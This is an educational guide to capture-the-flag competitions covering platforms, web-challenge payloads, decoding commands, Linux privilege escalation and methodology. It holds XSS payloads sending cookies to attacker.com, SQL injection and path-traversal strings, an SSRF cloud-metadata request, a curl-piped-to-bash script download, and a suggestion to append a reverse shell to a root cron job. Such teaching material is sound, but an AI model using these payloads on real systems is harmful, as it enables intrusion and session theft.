# CTF Basics & Platforms — Capture The Flag Guide

> **Category:** CTF & Competitive Hacking  
> **Week:** 4 — CTF & Career  
> **Best For:** Skill building, portfolio, job interviews, bug bounty mindset  
> **Platforms:** HackTheBox, TryHackMe, PicoCTF, CTFtime

---

## What is CTF?

Capture The Flag (CTF) is a cybersecurity competition where you solve hacking challenges to find a hidden string called a "flag". Every skill from this series — SQLi, XSS, IDOR, auth bypass — appears in CTF challenges. CTFs are the fastest way to build real, verifiable hacking skills.

**Flag format:** `CTF{s0m3_s3cr3t_str1ng}` → submit for points

**CTF types:**
- **Jeopardy:** Categories (Web, Crypto, Pwn, Forensics, Misc) — solve independently
- **Attack/Defense:** Teams attack each other's services while defending their own
- **Boot2Root:** Compromise a full machine — like HTB/THM machines

---

## 01 · Top CTF Platforms

### HackTheBox (HTB) — Industry Gold Standard
```
hacktheboxacademy.com → structured learning paths
app.hackthebox.com    → machines + standalone challenges

Start: Easy-rated retired machines → full writeups available
Pro tip: CPTS certification path = best offensive security cert
```

### TryHackMe — Best for Beginners
```
tryhackme.com → guided rooms with hints

Best paths to start:
→ Web Fundamentals
→ Jr Penetration Tester
→ Pre Security

No prior knowledge needed — walks you through everything
```

### PicoCTF — Free & Massive
```
picoctf.org → 100s of challenges, always free

Categories: Web, Crypto, Forensics, Binary, General Skills
Level: Beginner → Intermediate
Best for: First CTF experience, learning fundamentals
```

### Other platforms
```
CTFtime.org          → calendar of all upcoming CTFs worldwide
OverTheWire.org      → Bandit (Linux basics), Natas (web)
Root-Me.org          → 400+ challenges, very practical
pwn.college          → binary exploitation focus
CryptoHack.org       → cryptography challenges only
```

---

## 02 · Web CTF Challenges

```bash
# SQL Injection — classic login bypass
' OR 1=1-- -
admin'-- -
' UNION SELECT 1,flag,3 FROM flags-- -

# XSS — steal cookies
<script>fetch('https://attacker.com?c='+document.cookie)</script>
<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>

# IDOR — change IDs
GET /api/flag?user_id=1    → 403
GET /api/flag?user_id=0    → 200 → flag!
GET /api/flag?user_id=9999 → admin flag!

# Path Traversal
GET /download?file=../../../etc/passwd
GET /download?file=....//....//....//etc/flag.txt

# SSRF — internal services
GET /fetch?url=http://localhost/admin
GET /fetch?url=http://169.254.169.254/latest/meta-data/  # AWS metadata
```

---

## 03 · Crypto & Forensics

```bash
# Base64
echo 'Q1RGe2ZsYWd9' | base64 -d          # → CTF{flag}
base64 -d <<< 'Q1RGe2ZsYWd9'

# Hex decode
echo '4354467b666c61677d' | xxd -r -p     # → CTF{flag}
python3 -c "print(bytes.fromhex('4354467b666c61677d').decode())"

# ROT13
echo 'PGS{synt}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'   # → CTF{flag}

# Caesar cipher brute force
for i in $(seq 1 25); do echo "$i: $(echo 'cipher' | caesar $i)"; done

# Steganography — find hidden flags
strings suspicious.png | grep -i 'CTF{'
strings suspicious.jpg | grep -i 'flag'
file mystery.*                             # identify file type
binwalk -e archive.png                    # extract hidden files
steghide extract -sf image.jpg -p ""     # extract with empty password
exiftool image.jpg                        # check EXIF metadata

# CyberChef (best tool for CTF crypto)
# cyberchef.io → paste unknown data → click "Magic" button → auto-decodes
```

---

## 04 · Linux & Privilege Escalation

```bash
# After getting initial shell — run these:

# Check sudo rights
sudo -l
# If (ALL) NOPASSWD: /usr/bin/python3 → GTFOBins → sudo python3 -c 'import os; os.system("/bin/bash")'

# Find SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
# If root runs /opt/backup.sh and it's world-writable → append reverse shell

# Find writable files owned by root
find / -writable -user root 2>/dev/null

# Check for passwords in files
grep -r "password" /var/www/ 2>/dev/null
grep -r "flag" /home/ 2>/dev/null

# LinPEAS — automated PrivEsc scanner
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

---

## 05 · CTF Toolkit

| Tool | Use | Link |
|------|-----|------|
| CyberChef | Decode/encode/analyze anything | cyberchef.io |
| GTFOBins | PrivEsc via sudo/SUID | gtfobins.github.io |
| Burp Suite | Web challenge interception | portswigger.net |
| pwntools | Binary exploit framework | docs.pwntools.com |
| Ghidra | Reverse engineering | ghidra-sre.org |
| strings/file | Find flags in files | built-in Linux |
| binwalk | Extract hidden files | kali built-in |
| steghide | Steganography | kali built-in |
| hashcat/john | Password cracking | kali built-in |
| nmap | Port scanning | nmap.org |

---

## 06 · CTF Methodology

```
Step 1 — Read the challenge description carefully
         → hints are always hidden in the description

Step 2 — Identify the category
         → Web? → Burp Suite
         → Crypto? → CyberChef
         → File given? → strings, file, binwalk, exiftool

Step 3 — Try the obvious first
         → grep for CTF{ in all files
         → check page source, cookies, headers
         → try common passwords: admin, password, flag

Step 4 — Enumerate deeply
         → gobuster for web, strings for files
         → check every endpoint, every parameter

Step 5 — Google is allowed!
         → "CTF [challenge name]" writeup
         → Read writeups AFTER solving → learn new techniques

Step 6 — Write your own writeup
         → Document every step → builds portfolio
         → Post on Medium/GitHub → recruiters notice
```

---

## Checklist

```
☐  Start on TryHackMe — Web Fundamentals path first
☐  Do PicoCTF web challenges — beginner friendly
☐  Bookmark: cyberchef.io — use Magic button on unknown data
☐  HackTheBox retired easy boxes — full writeups available
☐  CTFtime.org — find upcoming CTFs and team up
☐  Write your own writeups — best portfolio builder
☐  Learn GTFOBins — every CTF machine needs PrivEsc
☐  Practice: strings/file/binwalk on every mystery file
```

---

*Daily Bug Bounty notes — follow for more.*
